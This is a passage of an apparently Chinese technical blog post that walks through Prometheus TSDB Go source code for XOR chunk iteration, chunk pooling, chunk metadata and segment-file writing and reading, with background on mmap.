class="comment">// XOR结果的个数相同)</span></span><br><span class="line"> &#125; <span class="keyword">else</span> &#123; <span class="comment">// 控制位为"11"，则表示XOR结果中前置"0"和后置"0"与前一个XOR值的个数相同</span></span><br><span class="line"> bits, err := it.br.readBits(<span class="number">5</span>) <span class="comment">// 读取XOR结果中前置"0"的个数(5个bit位)</span></span><br><span class="line"> it.leading = <span class="keyword">uint8</span>(bits) <span class="comment">// 更新leading字段，记录前置"0"的个数</span></span><br><span class="line"> bits, err = it.br.readBits(<span class="number">6</span>) <span class="comment">// 读取XOR结果中非0部分的长度(6个bit位)</span></span><br><span class="line"> mbits := <span class="keyword">uint8</span>(bits)</span><br><span class="line"> <span class="keyword">if</span> mbits == <span class="number">0</span> &#123;</span><br><span class="line"> mbits = <span class="number">64</span></span><br><span class="line"> &#125;</span><br><span class="line"> it.trailing = <span class="number">64</span> - it.leading - mbits <span class="comment">// 计算XOR结果中后置"0"的个数</span></span><br><span class="line"> &#125;</span><br><span class="line"> mbits := <span class="keyword">int</span>(<span class="number">64</span> - it.leading - it.trailing) <span class="comment">// 计算XOR值中非0部分的位数</span></span><br><span class="line"> bits, err := it.br.readBits(mbits) <span class="comment">// 读取XOR结果中非0部分</span></span><br><span class="line"> <span class="comment">// 根据前一个时序点的value值以及XOR值，得到当前点的value值</span></span><br><span class="line"> vbits := math.Float64bits(it.val) </span><br><span class="line"> vbits ^= (bits &lt;&lt; it.trailing)</span><br><span class="line"> it.val = math.Float64frombits(vbits) <span class="comment">// 更新val字段</span></span><br><span class="line"> &#125;</span><br><span class="line"> it.numRead++ <span class="comment">// 此次读取完成，递增numRead字段</span></span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从前面对xorIterator.Next()方法以及readValue()方法的分析我们可以看到，xorIterator在迭代过程中始终使用t和val字段记录当前时序点的timestamp和value值，在xorIterator.At()方法中也是始终返回这两个字段值，其实现比较简单，这里不再展开介绍。</p><h3 id="Pool"><a href="#Pool" class="headerlink" title="Pool"></a>Pool</h3><p>结构体pool是一个内存中的XORChunk实例池，其底层是基于sync.Pool实现的。这里简单介绍一下Golang中的sync.Pool，Golang除了像JVM那样提供了一些垃圾回收的机制，还提供了很多避免产生垃圾对象的机制，例如这里介绍的池化技术。</p><p>在Golang标准库的很多包中，都使用了对象池来避免产生过多的垃圾对象，例如我们经常使用的fmt包、regexp包等，都各自实现了对象池，且它们的实现都很类似。另外，这种对象池的实现都不会释放内存，这就会与垃圾收集器的思想产生冲突，在某些场景中导致内存使用过高。</p><p>就上述问题，曾有人建议在sync包里加入一个公开的池类型供大家复用。当然，这也面临很多问题，例如，这个池类型应该放到标准库中吗？如果放到标准库中，应该公开吗？这个池类型的实现应该释放内存吗？如果需要释放内存，那在什么时机释放？这个新增的类型应该叫做Cache还是Pool？</p><p>这里可以先简单区分一下Cache和Pool的区别。读者可以将Cache理解成一个全局的Map，我们可以根据不同的Key获取到不同的Value，而Pool中的存储的元素完全一样，与刚初始化完成的实例完全一样。另外，Cache会使用不同的过期算法进行清理，例如LRU、LFU、LIRS等等。</p><p>大家特别关心另一个点是Pool在何时释放内存。有人建议在GC之前进行释放，也有人建议在在GC之后进行释放，还有人提出基于过期时间或者使用弱引用的方式。虽然这些建议都有自己的理由，但同时也都有一些弊端。最终，Golang官方决定在垃圾收集时释放Pool占用的内存空间，也就是说，Pool中的对象是在两次垃圾收集之间进行重用的。而且，这也突出了Pool的目的是让垃圾回收变得更加高效，而不是避免垃圾回收。</p><p>大致了解了sync.pool的设计初衷和目标之后，我们来看Prometheus TSDB中Pool接口的定义，如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Pool <span class="keyword">interface</span> &#123;</span><br><span class="line"> Put(Chunk) error <span class="comment">// 将Chunk实例放回到池中</span></span><br><span class="line"> Get(e Encoding, b []<span class="keyword">byte</span>) (Chunk, error) <span class="comment">// 根据指定的Encoding从池中获取Chunk实例</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Prometheus TSDB中提供了该Pool接口的唯一实现——结构体pool，其底层依赖Golang sync.Pool实现，其NewPool()方法实际上就是初始化sync.Pool实例，如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewPool</span><span class="params">()</span> <span class="title">Pool</span></span> &#123;</span><br><span class="line"> <span class="keyword">return</span> &amp;pool&#123;</span><br><span class="line"> xor: sync.Pool&#123;</span><br><span class="line"> <span class="comment">// 如果调用Pool.Get()方法从池中获取对象时没有可用的Chunk实例，则会通过该函数</span></span><br><span class="line"> <span class="comment">// 创建新的XORChunk实例返回</span></span><br><span class="line"> New: <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">interface</span></span>&#123;&#125; &#123; <span class="keyword">return</span> &amp;XORChunk&#123;b: &amp;bstream&#123;&#125;&#125; &#125;,</span><br><span class="line"> &#125;,</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体pool的Get()方法和Put()方法会先检测Chunk实例的类型，然后调用sync.Pool实现从池中读取Chunk实例以及向池中放回Chunk实例的功能，大致实现如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pool)</span> <span class="title">Get</span><span class="params">(e Encoding, b []<span class="keyword">byte</span>)</span> <span class="params">(Chunk, error)</span></span> &#123;</span><br><span class="line"> <span class="keyword">switch</span> e &#123;</span><br><span class="line">  <span class="keyword">case</span> EncXOR:</span><br><span class="line"> c := p.xor.Get().(*XORChunk) <span class="comment">// 从Pool中获取XORChunk实例</span></span><br><span class="line"> c.b.stream = b <span class="comment">// 填充bstream</span></span><br><span class="line"> c.b.count = <span class="number">0</span></span><br><span class="line"> <span class="keyword">return</span> c, <span class="literal">nil</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">nil</span>, errors.Errorf(<span class="string">"invalid encoding %q"</span>, e)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pool)</span> <span class="title">Put</span><span class="params">(c Chunk)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"> <span class="keyword">switch</span> c.Encoding() &#123;</span><br><span class="line"> <span class="keyword">case</span> EncXOR:</span><br><span class="line"> xc, ok := c.(*XORChunk) <span class="comment">// 检测传入的Chunk实例的实际类型</span></span><br><span class="line"> xc.b.stream = <span class="literal">nil</span> <span class="comment">// 清空XORChunk底层的bstream</span></span><br><span class="line"> xc.b.count = <span class="number">0</span></span><br><span class="line"> p.xor.Put(c) <span class="comment">// 将XORChunk实例放入到Pool中</span></span><br><span class="line"> <span class="keyword">default</span>:</span><br><span class="line"> <span class="keyword">return</span> errors.Errorf(<span class="string">"invalid encoding %q"</span>, c.Encoding())</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Meta元数据"><a href="#Meta元数据" class="headerlink" title="Meta元数据"></a>Meta元数据</h3><p>通过上一小节的介绍，我们了解到Chunk中存储的都是时序数据，每个Chunk实例都有一些关联的元数据信息，例如Chunk实例所覆盖的时间范围，这些元数据记录到了Meta实例中。结构体Meta的核心字段如下：</p><ul><li><strong>Ref（uint64类型）</strong>：Ref字段记录了关联Chunk在磁盘上的位置信息，主要用于读取。</li><li><strong>Chunk（chunkenc.Chunk类型）</strong>：指向XORChunk实例。在后面介绍ChunkWriter时会看到，在将Chunk中时序数据持久化到文件时，该字段必须有值。</li><li><strong>MinTime、MaxTime（int64类型）</strong>：MinTime和MaxTime两个字段记录了Chunk实例所覆盖的时间范围。</li></ul><p>Meta结构体中提供了两个辅助方法，一个是writeHash()方法，它负责为关联的Chunk计算Hash值。另一个方法是OverlapsClosedInterval()方法，该方法用于确定给定的时间范围是与关联Chunk实例所覆盖的时间范围有重合。如图2-5所示，三种场景下，给定的时间范围都与Chunk有重合。</p><p><img src="https://pic3.zhimg.com/80/v2-dbbb8ff29b8dacff29e341677ea5fcea_hd.jpg" alt="img"></p><p>Meta结构体中的这两个方法的实现比较简单，这里不再粘贴代码。</p><h3 id="ChunkWriter"><a href="#ChunkWriter" class="headerlink" title="ChunkWriter"></a>ChunkWriter</h3><p>通过前面小节的介绍，我们了解到Prometheus TSDB是如何在内存中组织时序数据的，那么这些内存中的时序数据是如何持久化到磁盘上呢？时序数据在磁盘上的组织方式又是什么样子的呢？本小节将通过对ChunkWriter 接口及其实现的分析来解答这些问题。</p><p>ChunkWriter是Prometheus TSDB中负责时序数据持久化的接口之一，通过该接口的定义（如下）可以看到其最核心的方法是WriteChunks()，该方法的主要功能就是持久化多个Chunk实例中的时序数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ChunkWriter <span class="keyword">interface</span> &#123;</span><br><span class="line"> WriteChunks(chunks ...chunks.Meta) error</span><br><span class="line"> Close() error <span class="comment">// 关闭底层关联的文件资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里注意WriteChunks()方法的参数，传入的是多个Meta实例，WriteChunks()方法要求每个Meta实例的Chunk字段必须有值。在完成写入之后，Meta实例的Ref字段也会被自动赋值，用于后面进行读取操作。</p><p>chunks.Writer结构体实现了上述ChunkWriter接口，在开始分析chunks.Writer持久化时序数据的实现之前，先回顾一下Prometheus TSDB在磁盘上的目录以及文件结构，如图2-6所示。首先来看目录结构，Prometheus在data目录中维护了多个block目录，这些block目录都是以“b-”开头的，以递增编号结尾，每个block目录维护了一个时间段的时序数据以及相关的元数据。在每个block目录下都有一个index文件，其中维护了索引的相关内容，还有一个meta.json文件，其中维护了block目录相关的元数据，这两个文件的内容在后面详细分析。这里重点来看chunks目录，顾名思义，其中存储的就是前面介绍的Chunk实例中存储的时序数据，chunks目录下的每个文件的大小都有上限（defaultChunkSegmentSize），到达上限之后会切换到新文件继续写入时序数据。为了便于描述，笔者将chunks目录下的文件称为“segment文件”，每个segment文件的名称都是以递增序号进行命名的。</p><p><img src="https://pic2.zhimg.com/80/v2-2c1185d7638acd6d5bb341e969ace755_hd.jpg" alt="img"></p><p>了解了Prometheus TSDB在磁盘上大致的目录结构之后，再来深入到segment文件中分析一下其存储格式。如图2-7所示，在创建segment文件时，首先会写入一个8字节的文件头，之后才会开始写入Chunk数据。在持久化一个Chunk的时候，会先写入该Chunk中时序数据所占的字节数，然后才写入该Chunk中记录的时序数据，最后计算该Chunk对应的CRC32循环校验码并写入到segment文件中。</p><p><img src="https://pic1.zhimg.com/80/v2-177127f2b230e3c88913e7ee9785f7b8_hd.png" alt="img"></p><p>了解了Prometheus TSDB存储时序数据的目录结构和文件格式之后，下面正式开始分析chunks.Writer结构体，其核心字段如下所示：</p><ul><li><strong>dirFile（*os.File类型）</strong>：磁盘上存储时序数据的目录。</li><li><strong>files（[]*os.File类型）</strong>：dirFile目录下存储时序数据的segment文件集合，其中只有最后一个segment文件是当前有效的，即当前可以写入数据数据的segment文件，之前的segment文件不可写。</li><li><strong>wbuf（*bufio.Writer类型）</strong>：用于写文件的bufio.Writer，该Writer是带缓冲区的。</li><li><strong>n（int64类型）</strong>：当前分段已经写入的字节数。</li><li><strong>crc32（hash.Hash类型）</strong>：crc32校验码，每一个写入的Chunk都会生成一个校验码。</li><li><strong>segmentSize（int64类型）</strong>：每个分段文件的大小上限，默认是512 * 1024 * 1024</li></ul><p>Prometheus TSDB通过NewWriter()函数创建Writer实例，其中同时还会创建存放segment文件的目录并赋予足够的操作权限，具体实现如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewWriter</span><span class="params">(dir <span class="keyword">string</span>)</span> <span class="params">(*Writer, error)</span></span> &#123;</span><br><span class="line"> <span class="comment">// 创建dir参数指定的目录，并给予足够的权限(略)</span></span><br><span class="line"> dirFile, err := fileutil.OpenDir(dir) <span class="comment">// 打开该目录</span></span><br><span class="line"> cw := &amp;Writer&#123; <span class="comment">// 初始化Writer实例</span></span><br><span class="line"> dirFile: dirFile,</span><br><span class="line"> n: <span class="number">0</span>,</span><br><span class="line"> crc32: newCRC32(), <span class="comment">// 创建复用的CRC32循环校验码</span></span><br><span class="line"> segmentSize: defaultChunkSegmentSize,</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> cw, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成Writer实例的初始化之后，就可以调用其WriteChunks()方法批量写入Chunk数据了。在该方法中，首先会根据此次写入的数据量以及当前segment文件的大小，决定是否要创建并切换到新的segment文件上完成此次写入，之后会按照前面介绍的segment文件的格式，逐个写入Chunk实例中的时序数据。WriteChunks()方法的具体实现如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">WriteChunks</span><span class="params">(chks ...Meta)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"> maxLen := <span class="keyword">int64</span>(binary.MaxVarintLen32) <span class="comment">// 计算此次待写入的所有Chunk实例的字节总数</span></span><br><span class="line"> <span class="keyword">for</span> _, c := <span class="keyword">range</span> chks &#123;</span><br><span class="line"> maxLen += binary.MaxVarintLen32 + <span class="number">1</span> </span><br><span class="line"> maxLen += <span class="keyword">int64</span>(<span class="built_in">len</span>(c.Chunk.Bytes()))</span><br><span class="line"> &#125;</span><br><span class="line"> newsz := w.n + maxLen <span class="comment">// 计算写入传入Chunk集合之后，当前segment文件所占的字节数</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 如果满足下述三个条件中的任意一个，则会通过cut()方法新建segment文件，此次传入的Chunk集合</span></span><br><span class="line"> <span class="comment">// 将全部写入到新建segment文件中:</span></span><br><span class="line"> <span class="comment">// 1、该chunks.Writer实例第一次写入</span></span><br><span class="line"> <span class="comment">// 2、写入之前，当前segment文件大小已经达到切分的阈值</span></span><br><span class="line"> <span class="comment">// 3、如果将传入Chunk集合写入之后，当前segment文件大小已经达到切分的阈值</span></span><br><span class="line"> <span class="keyword">if</span> w.wbuf == <span class="literal">nil</span> || w.n &gt; w.segmentSize || </span><br><span class="line"> newsz &gt; w.segmentSize &amp;&amp; maxLen &lt;= w.segmentSize &#123;</span><br><span class="line"> <span class="keyword">if</span> err := w.cut(); ... <span class="comment">// 省略错误处理的代码</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">var</span> (</span><br><span class="line"> b = [binary.MaxVarintLen32]<span class="keyword">byte</span>&#123;&#125;</span><br><span class="line"> <span class="comment">// 将当前segment文件在Writer.files集合中的下标，记录到seq变量的高32位中</span></span><br><span class="line"> seq = <span class="keyword">uint64</span>(w.seq()) &lt;&lt; <span class="number">32</span> </span><br><span class="line"> )</span><br><span class="line"> <span class="keyword">for</span> i := <span class="keyword">range</span> chks &#123; <span class="comment">// 将Chunk逐个写入到当前segment文件中</span></span><br><span class="line"> chk := &amp;chks[i]</span><br><span class="line"> <span class="comment">// 更新Ref字段，其中高32位明确了该Chunk在哪个segment文件中，低32位记录了该Chunk</span></span><br><span class="line"> <span class="comment">// 在该segment文件中的字节偏移量。在后面介绍读取过程时，还会看到Ref字段的作用</span></span><br><span class="line"> chk.Ref = seq | <span class="keyword">uint64</span>(w.n)</span><br><span class="line"> <span class="comment">// 统计该Chunk的字节数，并记录到segment文件中</span></span><br><span class="line"> n := binary.PutUvarint(b[:], <span class="keyword">uint64</span>(<span class="built_in">len</span>(chk.Chunk.Bytes())))</span><br><span class="line"> <span class="keyword">if</span> err := w.write(b[:n]); ...</span><br><span class="line"></span><br><span class="line"> b[<span class="number">0</span>] = <span class="keyword">byte</span>(chk.Chunk.Encoding()) <span class="comment">// 将Chunk的编码类型写入到segment文件中</span></span><br><span class="line"> <span class="keyword">if</span> err := w.write(b[:<span class="number">1</span>]); ... <span class="comment">// 省略错误处理的代码</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 将Chunk中记录的时序数据写入到segment文件中</span></span><br><span class="line"> <span class="keyword">if</span> err := w.write(chk.Chunk.Bytes()); ... <span class="comment">// 省略错误处理的代码</span></span><br><span class="line">  <span class="comment">// 计算该Chunk的CRC32校验码并写入到segment文件中</span></span><br><span class="line"> w.crc32.Reset()</span><br><span class="line"> <span class="keyword">if</span> err := chk.writeHash(w.crc32); ... <span class="comment">// 省略错误处理的代码</span></span><br><span class="line"> <span class="keyword">if</span> err := w.write(w.crc32.Sum(b[:<span class="number">0</span>])); ... <span class="comment">// 省略错误处理的代码</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在WriteChunks()方法中我们看到，无论是首次写入还是达到segment文件大小上限值，都会调用cut()方法。在cut()方法中会按序完成下列操作，实现segment文件的切换：</p><ol><li>调用finalizeTail()方法结束当前文件的写入。</li><li>获取新segment文件的名称，并创建对应的新segment文件。在新segment文件名的计算方式大致是：先获取当前目录下全部segment文件名并进行排序，正如前面在目录结构中介绍的那样，segment文件名中都是包含数字编号的，新segment文件名称就是当前最大的编号+1。该过程在nextSequenceFile()方法中实现，感兴趣的读者可以参考其代码进行学习，这里不再展开分析。</li><li>按照segmentSize字段指定的大小为新segment文件预分配空间。</li><li>向新segment文件写入8字节的文件头。</li><li>将新segment文件记录到Writer.files切片的末尾。</li></ol><p>Writer.cut()方法具体实现如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">cut</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"> <span class="comment">// 通过finalizeTail()方法完成当前文件的写入，其具体实现在后面详细介绍</span></span><br><span class="line"> <span class="keyword">if</span> err := w.finalizeTail(); ... </span><br><span class="line"> p, _, err := nextSequenceFile(w.dirFile.Name()) <span class="comment">// 计算下一个写入的新segment文件的名称</span></span><br><span class="line"></span><br><span class="line"> f, err := os.OpenFile(p, os.O_WRONLY|os.O_CREATE, <span class="number">0666</span>) <span class="comment">// 创建新segment文件</span></span><br><span class="line"> <span class="comment">// 按照segment文件大小的上限进行预分配</span></span><br><span class="line"> <span class="keyword">if</span> err = fileutil.Preallocate(f, w.segmentSize, <span class="literal">true</span>); ...</span><br><span class="line"> <span class="keyword">if</span> err = w.dirFile.Sync();... <span class="comment">// 将上述segment文件创建以及预分配操作同步到磁盘</span></span><br><span class="line"></span><br><span class="line"> metab := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">8</span>) <span class="comment">// 创建文件头，共占8个字节</span></span><br><span class="line"> binary.BigEndian.PutUint32(metab[:<span class="number">4</span>], MagicChunks) <span class="comment">// 前4个字节写入固定头信息</span></span><br><span class="line"> metab[<span class="number">4</span>] = chunksFormatV1 <span class="comment">// 写入版本信息</span></span><br><span class="line"> <span class="keyword">if</span> _, err := f.Write(metab); ... <span class="comment">// 将8字节文件头写入到segment文件中</span></span><br><span class="line"> w.files = <span class="built_in">append</span>(w.files, f) <span class="comment">// 将新建的segment文件记录到Writer.files集合中</span></span><br><span class="line"> <span class="keyword">if</span> w.wbuf != <span class="literal">nil</span> &#123;</span><br><span class="line"> w.wbuf.Reset(f) <span class="comment">// 将wbuf从上一个文件指向新建的文件</span></span><br><span class="line"> &#125; <span class="keyword">else</span> &#123; <span class="comment">// 第一次写入时会初始化wbuf字段，其缓冲区为8M</span></span><br><span class="line"> w.wbuf = bufio.NewWriterSize(f, <span class="number">8</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line"> &#125;</span><br><span class="line"> w.n = <span class="number">8</span> <span class="comment">// 已写入文件头，占用8个字节</span></span><br><span class="line"> <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Writer.finalizeTail()方法主要完成了两件事，一是将已写入当前segment文件的时序数据刷新到磁盘中，二是对当前segment文件中预分配但是未使用的部分进行截断，最后关闭文件，其具体实现如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">finalizeTail</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"> tf := w.tail() <span class="comment">// 获取files集合中最后一个文件，即当前有效的写入文件</span></span><br><span class="line"> <span class="comment">// 调用wbuf字段(bufio.Writer)的Flush()方法将数据刷新到磁盘中(略)</span></span><br><span class="line"> <span class="keyword">if</span> err := w.wbuf.Flush();...<span class="comment">// 省略异常处理的相关代码</span></span><br><span class="line"> <span class="keyword">if</span> err := fileutil.Fsync(tf);... <span class="comment">// 省略异常处理的相关代码</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 前面在创建文件时会进行预分配，这里获取当前写入的位置，并调用Truncate()方法进行截断，</span></span><br><span class="line"> <span class="comment">// 将该文件中off之后的预分配的内容删掉</span></span><br><span class="line"> off, err := tf.Seek(<span class="number">0</span>, io.SeekCurrent)</span><br><span class="line"> <span class="keyword">if</span> err := tf.Truncate(off);...</span><br><span class="line"> <span class="keyword">return</span> tf.Close() <span class="comment">// 关闭当前文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此为止，ChunkWriter接口及其具体实现的内容就全部介绍完了。</p><h3 id="ChunkReader"><a href="#ChunkReader" class="headerlink" title="ChunkReader"></a>ChunkReader</h3><p>介绍完Prometheus TSDB持久化时序数据的相关实现之后，我们继续分析Prometheus TSDB如何将持久化的时序数据读取到内存中，并封装到相应的Chunk实例中。</p><p>首先来看读取时序数据的核心接口——ChunkReader，该接口的Chunk()方法会根据ref参数读取对应的Chunk并返回，这里的ref参数就是前面在写入Chunk实例时为其填充的Ref字段。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ChunkReader <span class="keyword">interface</span> &#123;</span><br><span class="line"> Chunk(ref <span class="keyword">uint64</span>) (chunkenc.Chunk, error) <span class="comment">// 根据ref参数读取相应的Chunk实例</span></span><br><span class="line"> Close() error <span class="comment">// 关闭当前ChunkReader并释放所有资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Prometheus TSDB中有多个 ChunkReader接口的实现，如图2-8所示，本小节主要介绍的是其中chunks.Reader实现，剩余两个实现在后面涉及到时再做描述。</p><p><img src="https://pic2.zhimg.com/80/v2-4b293fb68fc8c594597ff334ffa82985_hd.jpg" alt="img"></p><p>chunks.Reader结构体中的核心字段如下：</p><ul><li><strong>bs（[]ByteSlice类型）</strong>：ByteSlice接口是对byte切片的抽象，它提供了两个方法，一个是Len()方法，用于返回底层byte切片的长度，另一个方法是Range()方法，用于返回底层byte切片在指定区间内的数据。ByteSlice接口的实现是realByteSlice，realByteSlice则是[]byte的类型别名。bs字段存储的是时序数据，其中每个ByteSlice实例都对应一个segment文件的数据。</li><li><strong>cs（[]io.Closer类型）</strong>：当前Reader实例能够读取的文件集合，其中每个元素都对应一个segment文件。</li><li><strong>pool（chunkenc.Pool类型）</strong>：用于存储可重用的Chunk实例。</li></ul><p>在开始介绍chunks.Reader如何读取segment文件之前，我们先来简单介绍mmap相关的基础知识。</p><p><strong>mmap简介</strong></p><p>从Linux系统的角度来看，操作系统的内存空间被分为两大部分，分别是：内核空间、用户空间，其中“用户空间”和“内核空间”的空间大小、操作权限以及核心功能都是不尽相同。这里的“内核空间”是操作系统本身使用的内存空间，而“用户空间”则是提供给各个进程使用的内存空间。用户进程不具有访问内核资源的权限，例如访问硬件资源，因此一个用户进程需要使用内核资源的时候，就需要通过系统调用来完成。图2-9以读写磁盘文件为例，展示了用户进程进行系统调用的整个过程：</p><ol><li>首先是读取文件的过程，用户进程发出read()系统调用之后，会完成从用户态到内核态的上下文切换。之后会通过DMA将文件中的数据从磁盘拷贝到内核空间的缓冲区中。</li><li>将内核空间缓冲区的数据拷贝到用户空间的缓冲区中，然后read()系统调用返回，此时会完成从内核态到用户态的上下文切换，整个读取文件的过程结束。</li><li>之后是写入文件的过程，用户进程发出write()系统调用之后，会完成用户态到内核态的上下文切换。将数据从用户空间缓冲区拷贝到内核空间缓冲区。</li><li>最后，write()系统调用返回，同时进程会从内核态切换到用户态。而数据则将从内核缓冲区写入磁盘。到此为止，整个写入文件的过程结束。</li></ol><p><img src="https://pic1.zhimg.com/80/v2-56ad08b8c2261392a38d8ca51ee9e150_hd.jpg" alt="img"></p><p>所以一次文件读取过程涉及两次数据拷贝以及两次上下文切换，同理，一次文件写入过程也会涉及两次数据拷贝以及两次上下文切换。</p><p>mmap是操作系统提供的内存映射机制，它可以将磁盘上一个文件中的一部分映射到一个虚拟内存区域上，这样程序就可以像操作内存一样操作文件。mmap也是实现“零拷贝”的一种方式，其大致原理如下：</p><ol><li>用户进程发出mmap()系统调用之后，会完成从用户态到内核态的上下文切换。然后通过DMA将磁盘文件中的数据拷贝到内核空间的缓冲区中。</li><li>mmap()系统调用返回，用户进程会完成从内核态到用户态的上下文切换。接着用户空间和内核空间共享这个缓冲区，而不需要将其中的数据从内核空间拷贝到用户空间。因为用户空间和内核空间共享了这个缓冲区数据，所以用户空间就可以像在操作自己缓冲区中数据一般操作这个由内核空间共享的缓冲区。</li><li>在写入文件的时候，用户进程发出write()系统调用，用户进程从用户态切换到内核态，并向共享缓冲区中写入数据。</li><li>完成数据写入之后，write()系统调用返回，用户进程从内核态切换到用户态，同时会通过DMA将内核缓冲区中的数据刷新到磁盘中。</li></ol><p>mmap的工作原理如下图所示，其上下文切换的次数与前面介绍的传统I/O相同，在图2-10中也就没用展示，但是mmap进行内存拷贝的次数要比传统I/O的少：</p><p><img src="https://pic1.zhimg.com/80/v2-86e040f86279bb591fbd347490849060_hd.jpg" alt="img"></p><p>了解了mmap的原理之后，我们继续回到chunks.Reader进行分析。首先来看其初始化过程，该过程由chunks.NewDirReader()函数完成，该函数首先会获取指定chunks目录下的所有segment文件名并进行排序，然后通过mmap系统调用将segment文件映射到虚拟内存中，之后校验每个segment文件的内容是否合法（即segment文件开头是否为固定的MagicChunks文件头），最后创建对应的Reader实例。NewDirReader()函数的具体实现如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 